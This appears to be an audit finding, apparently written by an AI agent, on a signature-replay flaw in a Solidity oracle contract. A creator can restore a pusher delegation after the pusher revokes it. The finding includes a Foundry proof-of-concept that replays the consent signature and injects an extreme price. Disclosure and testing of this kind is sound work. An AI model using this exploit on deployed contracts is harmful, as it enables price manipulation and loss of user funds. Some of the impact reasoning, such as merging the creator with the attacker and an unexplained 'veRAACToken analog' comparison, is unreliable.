After thorough investigation of the codebase, I found a valid analog.

---

### Title
Pusher Consent Signature Replay Allows Creator to Re-Establish Delegation After Revocation, Permanently Bypassing Pusher's Revoke — (`smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol`)

---

### Summary

`allowPushers` does not track consumed signatures. A creator who holds a pusher's consent signature can replay it an unlimited number of times before the deadline expires, re-establishing `namespaceRemapping[pusher] = creator` immediately after every `revokePusher()` call. The code's own NatSpec states the deadline exists precisely to prevent this, but the implementation provides no such guarantee.

---

### Finding Description

`allowPushers` signs consent as:

```
hash = keccak256(abi.encode(block.chainid, address(this), deadline, pusher, creator))
```

The only replay guard is `_ensureDeadline(deadline)`, which checks `block.timestamp <= deadline`. [1](#0-0) 

There is no nonce, no used-signature bitmap, and no check that `namespaceRemapping[pusher]` is already zero before writing. The NatSpec comment directly above the function states:

> "The deadline is likewise required: the signed consent carries no timestamp of its own, so an undated signature could re-establish a delegation **AFTER the pusher revoked it**." [2](#0-1) 

`revokePusher` clears the mapping:

```solidity
namespaceRemapping[msg.sender] = address(0);
``` [3](#0-2) 

But because `allowPushers` performs no used-signature check, the creator can immediately call `allowPushers` again with the identical `(deadline, pusher, sig)` tuple and restore `namespaceRemapping[pusher] = creator`. This cycle can repeat indefinitely until the deadline timestamp passes.

The fallback push path resolves the namespace at call time:

```solidity
address creator = namespaceRemapping[msg.sender];
if (creator == address(0)) creator = msg.sender;
``` [4](#0-3) 

So every push the pusher makes after the creator's replay lands in the **creator's** namespace, not the pusher's own.

---

### Impact Explanation

**Bad-price execution path:**

1. A pusher's private key is compromised. The attacker begins pushing manipulated prices into the creator's namespace (e.g., inflated mid-price, zero spread).
2. The legitimate pusher calls `revokePusher()` to sever the delegation and stop the bad writes.
3. The creator (or the attacker who also controls the creator key) immediately calls `allowPushers` with the original, still-valid consent signature, restoring `namespaceRemapping[pusher] = creator`.
4. The compromised pusher key continues to push bad prices into the creator's namespace.
5. A `PriceProvider` or `ProtectedPriceProvider` reads from the creator's feedId via `price(feedId, pool)` during a live swap.
6. The manipulated mid-price and spread reach `_getBidAndAskPrice`, pass the staleness and guard checks (the timestamp is fresh), and produce a corrupted bid/ask pair that the pool executes against. [5](#0-4) 

The pool swap settles at the bad oracle price, causing direct loss of user principal or LP assets — a contest-relevant critical/high impact.

---

### Likelihood Explanation

- The creator must have retained the original consent signature bytes (trivially true: it was submitted on-chain and is recoverable from transaction history).
- The deadline must not yet have expired. Consent signatures are typically issued with multi-day or multi-week deadlines to accommodate operational windows; a compromised-key incident is likely to occur within that window.
- No special privilege is required: `allowPushers` is a public function callable by any address that can supply the matching signature.
- The attacker (creator) needs only one additional transaction after each `revokePusher()` call.

Likelihood: **Medium-High** — the preconditions are realistic and the replay requires no privileged access.

---

### Recommendation

Track consumed signatures with a used-signature mapping or a per-pusher nonce so that each consent can only establish delegation once:

```solidity
mapping(bytes32 => bool) private _usedConsentHashes;

function allowPushers(uint256 deadline, address[] calldata pushers, bytes[] memory signatures) external {
    _ensureDeadline(deadline);
    uint256 l = pushers.length;
    require(l == signatures.length);
    for (uint256 i; i < l; i++) {
        address pusher = pushers[i];
        if (pusher == msg.sender) revert NoSelfRemapping();

        bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
            keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
        );
        require(!_usedConsentHashes[hash], SignatureAlreadyUsed());  // ← add this
        require(pusher == ECDSA.recover(hash, signatures[i]));

        _usedConsentHashes[hash] = true;                             // ← and this
        namespaceRemapping[pusher] = msg.sender;
        emit PusherAuthorized(pusher, msg.sender);
    }
}
```

This mirrors the fix for the veRAACToken analog: just as `cancelEmergencyAction` must reset `emergencyWithdrawDelay` to zero, `allowPushers` must consume the signature so that a subsequent `revokePusher` cannot be undone by replaying it.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import {CompressedOracleV1} from "contracts/oracles/compressed/CompressedOracle.sol";
import {MessageHashUtils} from "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";

contract ReplayDelegationPoC is Test {
    CompressedOracleV1 oracle;
    uint256 constant PUSHER_KEY = 0xBEEF;
    address pusher;
    address creator = address(0xC0FFEE);

    function setUp() public {
        oracle = new CompressedOracleV1(address(this), 0);
        pusher = vm.addr(PUSHER_KEY);
        vm.warp(1_700_000_000);
    }

    function testRevocationBypassedBySignatureReplay() public {
        uint256 deadline = block.timestamp + 7 days;

        // 1. Pusher signs consent
        bytes32 digest = MessageHashUtils.toEthSignedMessageHash(
            keccak256(abi.encode(block.chainid, address(oracle), deadline, pusher, creator))
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(PUSHER_KEY, digest);
        bytes memory sig = abi.encodePacked(r, s, v);

        address[] memory pushers = new address[](1);
        pushers[0] = pusher;
        bytes[] memory sigs = new bytes[](1);
        sigs[0] = sig;

        // 2. Creator establishes delegation
        vm.prank(creator);
        oracle.allowPushers(deadline, pushers, sigs);
        assertEq(oracle.namespaceRemapping(pusher), creator, "delegation set");

        // 3. Pusher revokes (e.g., key compromised)
        vm.prank(pusher);
        oracle.revokePusher();
        assertEq(oracle.namespaceRemapping(pusher), address(0), "revoked");

        // 4. Creator replays the SAME signature — deadline still valid
        vm.prank(creator);
        oracle.allowPushers(deadline, pushers, sigs);  // no revert!
        assertEq(oracle.namespaceRemapping(pusher), creator, "delegation silently restored");

        // 5. Compromised pusher key pushes a bad price into creator's namespace
        uint56 tsMs = uint56(block.timestamp * 1000);
        uint48 badRaw = (uint48(9_999_999) << 16) | (uint48(0) << 8) | uint48(0); // extreme price, zero spread
        vm.prank(pusher);
        (bool ok,) = address(oracle).call(abi.encodePacked(
            (uint256(tsMs) << 8) | uint256(0) | (uint256(badRaw) << 208)
        ));
        assertTrue(ok, "bad push succeeded");

        // 6. Bad price is now live in creator's namespace, readable by price providers
        bytes32 feedId = oracle.feedIdOf(creator, 0, 0);
        // price() would return the manipulated value to any registered pool
        assertGt(oracle.getOracleData(feedId).price, 0, "bad price stored in creator namespace");
    }
}
```

### Citations

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L186-212)
```text
    /// @notice Delegates pusher wallets into the caller's namespace. The pusher's EIP-191
    ///         signature is REQUIRED — without it anyone could remap a foreign pusher
    ///         wallet into their own namespace and silently swallow its pushes. The
    ///         deadline is likewise required: the signed consent carries no timestamp of
    ///         its own, so an undated signature could re-establish a delegation AFTER the
    ///         pusher revoked it.
    function allowPushers(uint256 deadline, address[] calldata pushers, bytes[] memory signatures) external {
        _ensureDeadline(deadline);

        uint256 l = pushers.length;
        require(l == signatures.length);
        for (uint256 i; i < l; i++) {
            address pusher = pushers[i];

            if (pusher == msg.sender) {
                revert NoSelfRemapping();
            }

            bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
                keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
            );
            require(pusher == ECDSA.recover(hash, signatures[i]));

            namespaceRemapping[pusher] = msg.sender;
            emit PusherAuthorized(pusher, msg.sender);
        }
    }
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L238-243)
```text
    function revokePusher() external {
        address creator = namespaceRemapping[msg.sender];
        if (creator == address(0) || creator == msg.sender) revert NoSelfRemapping();
        namespaceRemapping[msg.sender] = address(0);
        emit PusherRevoked(msg.sender, creator);
    }
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L315-316)
```text
        address creator = namespaceRemapping[msg.sender];
        if (creator == address(0)) creator = msg.sender;
```

**File:** smart-contracts-poc/contracts/PriceProvider.sol (L191-231)
```text
    function _getBidAndAskPrice() internal returns (uint128, uint128) {
        // 1. Read via the unified price(feedId, pool) path, forwarding the pool (msg.sender).
        //    refTime is already in seconds.
        (uint256 mid, uint256 spread, , uint256 refTime) =
            IPricedOracle(address(offchainOracle)).price(offchainFeedId, msg.sender);

        // 2. Staleness check
        if (_isStale(refTime, block.timestamp, MAX_TIME_DELTA)) {
            return (0, type(uint128).max);
        }

        // 3. Basic validity — price must be positive, spread must not be stalled marker
        if (mid == 0 || spread >= ORACLE_BPS) {
            return (0, type(uint128).max);
        }

        // 4. Price guard check (moved from oracle)
        (uint128 guardMin, uint128 guardMax) = offchainOracle.priceGuard(offchainFeedId);
        guardMax = guardMax == 0 ? type(uint128).max : guardMax;
        if (mid < guardMin || mid > guardMax) {
            return (0, type(uint128).max);
        }

        // 5. Compute bid/ask from mid + confidence-adjusted spread
        //    confidenceParam multiplies oracle spread; 0 means no spread
        uint256 adjustedSpread = spread * confidenceParam;
        (uint256 bid, uint256 ask) = _getBidAskFrom(mid, adjustedSpread);

        // 6. Apply marginStep adjustment
        (uint256 bidOut, bool bidOk) = _applyBidAdjustments(bid);
        if (!bidOk || bidOut > type(uint128).max) return (0, type(uint128).max);

        (uint256 askOut, bool askOk) = _applyAskAdjustments(ask);
        if (!askOk || askOut > type(uint128).max) return (0, type(uint128).max);

        // 7. Hard invariant: bid must be strictly less than ask.
        //    Can be violated when marginStep < 0 and confidence is too small.
        if (bidOut >= askOut) return (0, type(uint128).max);

        return (uint128(bidOut), uint128(askOut));
    }
```
